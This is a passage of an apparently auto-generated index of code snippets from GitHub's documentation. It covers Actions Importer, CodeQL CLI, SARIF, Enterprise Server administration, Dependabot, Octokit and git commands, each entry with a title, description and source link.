https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run travis-ci --travis-ci-repository travis-org-name/travis-repo-name --output-dir ./output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\n----------------------------------------\n\nTITLE: Merging SARIF files with codeql github merge-results\nDESCRIPTION: This command merges multiple SARIF files into a single SARIF file. It requires the paths to the input SARIF files and the desired output file. This is a deep plumbing command, intended for advanced use cases like integrating with GitHub code scanning.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/github-merge-results.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql github merge-results --sarif=<file> --output=<file> <options>...\n```\n\n----------------------------------------\n\nTITLE: Checking Runner Service Status - Linux\nDESCRIPTION: Checks the status of the self-hosted runner service on Linux systems using `svc.sh`. Requires root privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo ./svc.sh status\n```\n\n----------------------------------------\n\nTITLE: Example GitHub Actions Importer Update Output\nDESCRIPTION: This code snippet shows the output from the `gh actions-importer update` command, indicating that the container image is up-to-date.  This confirms that the tool is running the latest available version. No specific dependencies are required beyond the GitHub CLI and the `actions-importer` extension being installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Creating issue with a milestone via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue and assign a milestone using the `milestone` query parameter. The example assigns the \"testing milestones\" milestone to the new issue.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_5\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?milestone=testing+milestones\n```\n\n----------------------------------------\n\nTITLE: Starting the Development Server for Playwright\nDESCRIPTION: This command starts the development server, which is necessary for running Playwright tests against a local instance.  It opens a server on <http://localhost:4000>.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nnpm run start-for-playwright\n```\n\n----------------------------------------\n\nTITLE: File Extension Code Search Example\nDESCRIPTION: This example demonstrates how to search for code files with a specific file extension using the `extension:` qualifier. The example searches for files containing the word \"form\" within the \"cgi-bin\" path that have a \".pm\" file extension.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-code.md#_snippet_0\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=form+path%3Acgi-bin+extension%3Apm&type=Code\n```\n\n----------------------------------------\n\nTITLE: Defining Jobs in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to define two jobs, `my_first_job` and `my_second_job`, within a GitHub Actions workflow. Each job is given a unique identifier (`job_id`) and a name. The `job_id` must start with a letter or `_` and contain only alphanumeric characters, `-`, or `_`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-jobs-in-a-workflow-id.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  my_first_job:\n    name: My first job\n  my_second_job:\n    name: My second job\n```\n\n----------------------------------------\n\nTITLE: Transforming Unknown Bamboo Variables\nDESCRIPTION: This snippet shows how unknown Bamboo variables are transformed to GitHub Actions variables. Unknown variables are transformed to `${{ env.<variableName> }}` and must be replaced or added under `env` for proper operation.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_18\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ env.jira_baseUrl }}\n```\n\n----------------------------------------\n\nTITLE: Exposing OIDC Token Service URLs\nDESCRIPTION: These URLs need to be exposed on the {% data variables.location.product_location_enterprise %} to the public internet when using OIDC for connecting to a storage provider. The storage provider requires access to these URLs for authentication.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/enterprise-oidc-prereqs.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://HOSTNAME/_services/token/.well-known/openid-configuration\nhttps://HOSTNAME/_services/token/.well-known/jwks\n```\n\n----------------------------------------\n\nTITLE: Enabling GitHub Packages\nDESCRIPTION: This snippet prepares the staging instance to enable GitHub Packages. It sets the `app.packages.enabled` configuration to `true`. This is a prerequisite step before applying the overall configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.packages.enabled true\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for FPT version\nDESCRIPTION: This snippet checks if the current version is FPT and renders 'condition-a' if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\ncondition-a\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: CITATION.cff with Preferred Citation\nDESCRIPTION: This example demonstrates a CITATION.cff file with a `preferred-citation` override, pointing to a research article instead of the software itself.  The `preferred-citation` section specifies details like type, authors, DOI, journal, month, start, end, title, issue, volume, and year.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\ncff-version: 1.2.0\nmessage: \"If you use this software, please cite it as below.\"\nauthors:\n- family-names: \"Lisa\"\n  given-names: \"Mona\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\n- family-names: \"Bot\"\n  given-names: \"Hew\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\ntitle: \"My Research Software\"\nversion: 2.0.4\ndoi: 10.5281/zenodo.1234\ndate-released: 2017-12-18\nurl: \"https://github.com/github-linguist/linguist\"\npreferred-citation:\n  type: article\n  authors:\n  - family-names: \"Lisa\"\n    given-names: \"Mona\"\n    orcid: \"https://orcid.org/0000-0000-0000-0000\"\n  - family-names: \"Bot\"\n    given-names: \"Hew\"\n    orcid: \"https://orcid.org/0000-0000-0000-0000\"\n  doi: \"10.0000/00000\"\n  journal: \"Journal Title\"\n  month: 9\n  start: 1 # First page number\n  end: 10 # Last page number\n  title: \"My awesome research software\"\n  issue: 1\n  volume: 1\n  year: 2021\n```\n\n----------------------------------------\n\nTITLE: SARIF properties example\nDESCRIPTION: This JSON snippet demonstrates the structure and properties of a SARIF (Static Analysis Results Interchange Format) file, specifically tailored for code scanning results.  It includes definitions for tool drivers, rules, results, locations, and other relevant metadata. The example provides a comprehensive overview of the SARIF schema and its usage in representing static analysis findings. The properties showcase the different fields available and their structure including tool name, version, rules, messages, locations, and fingerprints.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n  \"version\": \"2.1.0\",\n  \"runs\": [\n    {\n      \"tool\": {\n        \"driver\": {\n          \"name\": \"Tool Name\",\n          \"semanticVersion\": \"2.0.0\",\n          \"rules\": [\n            {\n              \"id\": \"3f292041e51d22005ce48f39df3585d44ce1b0ad\",\n              \"name\": \"js/unused-local-variable\",\n              \"shortDescription\": {\n                \"text\": \"Unused variable, import, function or class\"\n              },\n              \"fullDescription\": {\n                \"text\": \"Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.\"\n              },\n              \"defaultConfiguration\": {\n                \"level\": \"note\"\n              },\n              \"properties\": {\n                \"tags\": [\n                  \"maintainability\"\n                ],\n                \"precision\": \"very-high\"\n              }\n            },\n            {\n              \"id\": \"d5b664aefd5ca4b21b52fdc1d744d7d6ab6886d0\",\n              \"name\": \"js/inconsistent-use-of-new\",\n              \"shortDescription\": {\n                \"text\": \"Inconsistent use of 'new'\"\n              },\n              \"fullDescription\": {\n                \"text\": \"If a function is intended to be a constructor, it should always be invoked with 'new'. Otherwise, it should always be invoked as a normal function, that is, without 'new'.\"\n              },\n              \"properties\": {\n                \"tags\": [\n                  \"reliability\",\n                  \"correctness\",\n                  \"language-features\"\n                ],\n                \"precision\": \"very-high\"\n              }\n            },\n            {\n              \"id\": \"R01\"\n            }\n          ]\n        }\n      },\n      \"automationDetails\": {\n        \"id\": \"my-category/\"\n      },\n      \"results\": [\n        {\n          \"ruleId\": \"3f292041e51d22005ce48f39df3585d44ce1b0ad\",\n          \"ruleIndex\": 0,\n          \"message\": {\n            \"text\": \"Unused variable foo.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"main.js\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 2,\n                  \"startColumn\": 7,\n                  \"endColumn\": 10\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"39fa2ee980eb94b0:1\",\n            \"primaryLocationStartColumnFingerprint\": \"4\"\n          }\n        },\n        {\n          \"ruleId\": \"d5b664aefd5ca4b21b52fdc1d744d7d6ab6886d0\",\n          \"ruleIndex\": 1,\n          \"message\": {\n            \"text\": \"Function resolvingPromise is sometimes invoked as a constructor (for example [here](1)), and sometimes as a normal function (for example [here](2)).\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"src/promises.js\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 2\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"5061c3315a741b7d:1\",\n            \"primaryLocationStartColumnFingerprint\": \"7\"\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"src/ParseObject.js\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 2281,\n                  \"startColumn\": 33,\n                  \"endColumn\": 55\n                }\n              },\n              \"message\": {\n                \"text\": \"here\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"src/LiveQueryClient.js\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 166\n                }\n              },\n              \"message\": {\n                \"text\": \"here\"\n              }\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"R01\",\n          \"message\": {\n            \"text\": \"Specifying both [ruleIndex](1) and [ruleId](2) might lead to inconsistencies.\"\n          },\n          \"level\": \"error\",\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"full.sarif\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 54,\n                  \"startColumn\": 10,\n                  \"endLine\": 55,\n                  \"endColumn\": 25\n                }\n              }\n            }\n          ],\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"full.sarif\"\n                },\n                \"region\": {\n                  \"startLine\": 81,\n                  \"startColumn\": 10,\n                  \"endColumn\": 18\n                }\n              },\n              \"message\": {\n                \"text\": \"here\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"full.sarif\"\n                },\n                \"region\": {\n                  \"startLine\": 82,\n                  \"startColumn\": 10,\n                  \"endColumn\": 21\n                }\n              },\n              \"message\": {\n                \"text\": \"here\"\n              }\n            }\n          ],\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"region\": {\n                            \"startLine\": 11,\n                            \"endLine\": 29,\n                            \"startColumn\": 10,\n                            \"endColumn\": 18\n                          },\n                          \"artifactLocation\": {\n                            \"uriBaseId\": \"%SRCROOT%\",\n                            \"uri\": \"full.sarif\"\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"Rule has index 0\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"region\": {\n                            \"endColumn\": 47,\n                            \"startColumn\": 12,\n                            \"startLine\": 12\n                          },\n                          \"artifactLocation\": {\n                            \"uriBaseId\": \"%SRCROOT%\",\n                            \"uri\": \"full.sarif\"\n                          }\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"ABC:2\"\n          }\n        }\n      ],\n      \"columnKind\": \"utf16CodeUnits\"\n    }\n  ]\n}\n\n```\n\n----------------------------------------\n\nTITLE: Using nslookup to check hostname resolution\nDESCRIPTION: This command allows you to check if a hostname resolves to an IP address. It is useful for diagnosing `failed to connect to host` errors. Replace `octodex.github.com` with the actual hostname you want to check.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/troubleshooting-webhooks.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnslookup octodex.github.com\n```\n\n----------------------------------------\n\nTITLE: Stopping Replication\nDESCRIPTION: This command stops replication on each replica node in a high-availability or geo-replication setup. It's necessary before upgrading the storage on the primary node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-stop\n```\n\n----------------------------------------\n\nTITLE: Creating an Octokit.js App Instance\nDESCRIPTION: This snippet creates a new instance of the `App` class from Octokit.js. Replace `APP_ID` and `PRIVATE_KEY` with your app's ID and private key, respectively.  The `appId` and `privateKey` are required for the app to authenticate correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n const app = new App({\n  appId: APP_ID,\n  privateKey: PRIVATE_KEY,\n });\n```\n\n----------------------------------------\n\nTITLE: Handling Incorrect Client Credentials - JSON\nDESCRIPTION: This JSON snippet shows the error response when the `client_id` or `client_secret` provided in the OAuth app's access token request is incorrect. To resolve this, verify the `client_id` and `client_secret` values passed in the request.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-oauth-app-access-token-request-errors.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\": \"incorrect_client_credentials\",\n  \"error_description\": \"The client_id and/or client_secret passed are incorrect.\",\n  \"error_uri\": \"/apps/managing-oauth-apps/troubleshooting-oauth-app-access-token-request-errors/#incorrect-client-credentials\"\n}\n```\n\n----------------------------------------\n\nTITLE: CodeQL query result example\nDESCRIPTION: This example shows the output of a CodeQL query, specifically identifying the location and description of an empty `then` block in the `Test.java` file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n\n| Test.java:3:5:3:22 | stmt | This if statement has an empty then. |\n\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration Changes\nDESCRIPTION: This command applies the configuration changes made to the primary node. It's essential to run this command after making any changes to the replication settings to ensure they take effect.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n(primary)$ ghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Storage Configuration Success Output\nDESCRIPTION: This is the expected output of `ghe-actions-precheck` if the storage configuration is valid. It confirms that all storage tests have passed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_68\n\nLANGUAGE: text\nCODE:\n```\nAll Storage tests passed\n```\n\n----------------------------------------\n\nTITLE: Syncing Amazon S3 buckets\nDESCRIPTION: This command synchronizes data between a source and destination Amazon S3 bucket using `aws s3 sync`. It copies new and updated objects from the source to the destination, ensuring the destination bucket reflects the source bucket's contents. Requires the AWS CLI to be configured with appropriate permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/using-a-staging-environment.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\naws s3 sync s3://SOURCE-BUCKET s3://DESTINATION-BUCKET\n```\n\n----------------------------------------\n\nTITLE: Configuring Bundler with a token\nDESCRIPTION: This snippet shows how to configure Dependabot to authenticate with a private RubyGems server using a token in the `dependabot.yml` file. The registry type, URL, and token (stored as a secret) are specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  ruby-github:\n    type: rubygems-server\n    url: https://rubygems.pkg.github.com/octocat/github_api\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Example Docker Push Command\nDESCRIPTION: This is an example of the `docker push` command, showing how to push a Docker image to the GitHub Container Registry. Make sure the image exists and is correctly tagged.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ndocker push {% ifversion fpt or ghec %}ghcr.io{% elsif ghes %}{% data reusables.package_registry.container-registry-example-hostname %}{% endif %}/octocat/hello_docker:latest\n```\n\n----------------------------------------\n\nTITLE: Using a skill in GitHub Copilot Chat\nDESCRIPTION: This example shows how to explicitly ask GitHub Copilot Chat to use a specific skill.  In this instance, the user prompts Copilot to use the Bing skill to retrieve the latest GPT4 model information from OpenAI.  This demonstrates the skill usage feature and assumes the Bing skill is available and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/copilot-chat/asking-github-copilot-questions-in-github.md#_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nUse the Bing skill to find the latest GPT4 model from OpenAI\n```\n\n----------------------------------------\n\nTITLE: Matrix Testing with Multiple Ruby Implementations\nDESCRIPTION: This YAML snippet demonstrates matrix testing across various Ruby implementations and operating systems. It tests MRI, JRuby, and TruffleRuby on both Ubuntu and macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Matrix Testing\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n    runs-on: {% raw %}${{ matrix.os }}-latest{% endraw %}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu, macos]\n        ruby: [2.5, 2.6, 2.7, head, debug, jruby, jruby-head, truffleruby, truffleruby-head]\n    continue-on-error: {% raw %}${{ endsWith(matrix.ruby, 'head') || matrix.ruby == 'debug' }}{% endraw %}\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: {% raw %}${{ matrix.ruby }}{% endraw %}\n      - run: bundle install\n      - run: bundle exec rake\n```\n\n----------------------------------------\n\nTITLE: Installing the gh-ado2gh GitHub CLI Extension\nDESCRIPTION: This command installs the `gh-ado2gh` GitHub CLI extension, which is used for migrating repositories from Azure DevOps to GitHub. It requires the GitHub CLI to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install github/gh-ado2gh\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Time with Chronyc\nDESCRIPTION: This snippet uses the `chronyc` command to immediately synchronize the server's time with the configured NTP server. It requires `sudo` privileges to execute. The `-a makestep` option forces the time to be stepped even if it's a large offset.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-time-synchronization.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo chronyc -a makestep\n```\n\n----------------------------------------\n\nTITLE: Nagios Host and Service Definition\nDESCRIPTION: This snippet provides example Nagios host and service definitions for monitoring the GitHub Enterprise Server cluster status.  The host definition specifies the IP address of the node, and the service definition uses the previously defined command to check the cluster status.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\ndefine host{\n     use                     generic-host\n     host_name               ghe-data-node-0\n     alias                   ghe-data-node-0\n     address                 10.11.17.180\n    }\n\ndefine service{\n   use                             generic-service\n   host_name                       ghe-data-node-0\n   service_description             GitHub Cluster Status\n   check_command                   check_ssh_ghe_cluster\n   }\n```\n\n----------------------------------------\n\nTITLE: Creating Jekyll Site in Shell\nDESCRIPTION: This shell command creates a new Jekyll site in the current directory, skipping the bundle installation step.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\njekyll new --skip-bundle .\n```\n\n----------------------------------------\n\nTITLE: Querying initial pull requests with pagination in GraphQL\nDESCRIPTION: This GraphQL query retrieves the first page of pull requests for a given repository, including the creation date, number, and title of each pull request. It also fetches pagination information like `endCursor`, `startCursor`, `hasNextPage`, and `hasPreviousPage` from the `pageInfo` object. The `first` argument specifies the number of pull requests to retrieve (up to 100), and the `after` argument is initially set to null for the first page.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-pagination-in-the-graphql-api.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery($owner: String!, $name: String!) {\n  repository(owner: $owner, name: $name) {\n    pullRequests(first: 100, after: null) {\n      nodes {\n        createdAt\n        number\n        title\n      }\n      pageInfo {\n        endCursor\n        startCursor\n        hasNextPage\n        hasPreviousPage\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Modified Migration Data via SCP\nDESCRIPTION: This command securely copies a modified _.csv_ file (e.g., conflicts.csv) to a target instance using the `scp` command. It requires the hostname or IP address of the target instance and the correct port number.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nscp -P 122 ~/Desktop/conflicts.csv admin@HOSTNAME:/home/admin/\n```\n\n----------------------------------------\n\nTITLE: Skipping checks for a commit using git\nDESCRIPTION: This snippet demonstrates how to skip checks for a commit by adding the `skip-checks: true` trailer to the commit message. It requires Git to be installed and configured. The input is a commit message string, and the output is a commit with checks skipped.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/about-status-checks.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Update README\n>\n>\nskip-checks: true\"\n```\n\n----------------------------------------\n\nTITLE: Example client.file reference\nDESCRIPTION: This code shows an example object for `client.file`, which represents the full content of the currently active file in the IDE. It includes the reference type, data (content and language), ID, is_implicit flag, and metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/context-passing-for-your-agent.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    // The reference type.\n    \"type\": \"client.file\",\n    \"data\": {\n        // The full content of the active file. \n        \"content\": \"Lorem ipsum dolor sit amet, consectetur adipiscing elit\",\n        \"language\": \"plaintext\"\n    },\n    \"id\": \"relative-path/to/file\",\n    // `is_implicit` indicates whether the reference was automatically provided by the client (true) or manually attached by the user (false).\n    \"is_implicit\": true,\n    \"metadata\": {\n        \"display_name\": \"https://github.com/example-user/example-repository\",\n        \"display_icon\": \"\",\n        \"display_url\": \"\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Linking to the Same Article Different Version - Liquid/Markdown\nDESCRIPTION: This markdown snippet with liquid templates demonstrates how to link to the same article in a different version of GitHub documentation, using the `currentArticle` liquid variable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_20\n\nLANGUAGE: liquid/markdown\nCODE:\n```\n{% raw %}For more information, see [the VERSION documentation](/VERSION/{{ currentArticle }}).{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Configure Git to Use Sublime Text (Windows)\nDESCRIPTION: This command configures Git to use Sublime Text as the default text editor on Windows. It specifies the full path to the `subl.exe` executable. The `-w` flag ensures Git waits for Sublime Text to close before continuing.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/associating-text-editors-with-git.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global core.editor \"'C:/Program Files (x86)/sublime text 3/subl.exe' -w\"\n```\n\n----------------------------------------\n\nTITLE: Job Concurrency with Staging Environment\nDESCRIPTION: This YAML snippet defines concurrency for a job targeting a staging environment.  It assigns the job to a `staging_environment` concurrency group. If a new run of the job is triggered, any in-progress runs of the same job within the `staging_environment` group are automatically cancelled.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: staging_environment\n      cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: CodeQL Diagnostic Export Command\nDESCRIPTION: This command exports diagnostic information for a failed analysis using the CodeQL CLI. It requires a format to be specified and allows for optional output path and additional options.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/diagnostic-export.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql diagnostic export --format=<format> [--output=<output>] <options>...\n```\n\n----------------------------------------\n\nTITLE: Applying a Commit using `git cherry-pick`\nDESCRIPTION: This snippet explains how to apply a specific commit to the current branch using the `git cherry-pick` command. It requires the SHA of the commit to be applied. This command is typically used after identifying the commit to recover from the `git reflog` output.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/managing-commits/checking-out-a-commit-in-github-desktop.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit cherry-pick 8bd5e736a2\n```\n\n----------------------------------------\n\nTITLE: Executing CodeQL Resolve ML Models\nDESCRIPTION: Executes the `codeql resolve ml-models` command in the shell, passing options and query/directory/suite/pack arguments. This command is used to determine accessible machine learning models for CodeQL queries, but is deprecated and now returns an empty list. The query can be a scope/name@range:path.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-ml-models.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve ml-models <options>... -- <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: Clearing Windows Credential Manager Credentials\nDESCRIPTION: This command removes the stored HTTPS credentials for GitHub from the Windows Credential Manager. This is required to ensure that when prompted, Git asks for the correct credentials for the current repository.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-your-personal-account/managing-multiple-accounts.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncmdkey /delete:LegacyGeneric:target=git:https://github.com\n```\n\n----------------------------------------\n\nTITLE: Enabling Maintenance Mode (Shell)\nDESCRIPTION: This command enables maintenance mode for the GitHub Enterprise Server cluster. This blocks user access and prevents data changes.  It relies on the `ghe-cluster-maintenance` command line utility, and requires the `-s` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-maintenance -s\n```\n\n----------------------------------------\n\nTITLE: Expanding Search Index for HA Configuration - Shell\nDESCRIPTION: This command expands the search index for a high availability configuration of GitHub Enterprise Server. It accesses the administrative shell and executes a script designed for HA setups, configuring search indices across the instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-web-ui/managing-search-indices-for-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n/usr/local/share/enterprise/ghe-es-auto-expand -v 0-all\n```\n\n----------------------------------------\n\nTITLE: Handling Git Non-Fast-Forward Error with Git Pull\nDESCRIPTION: This code snippet shows how to resolve a non-fast-forward error using the `git pull` command. This command combines the `git fetch` and `git merge` operations into a single step, making it a convenient way to update your local branch with the latest changes from the remote repository. Requires Git to be installed and configured. Input is a command line instruction. Output is the resolved state with the remote branch merged into the local branch.\nSOURCE: 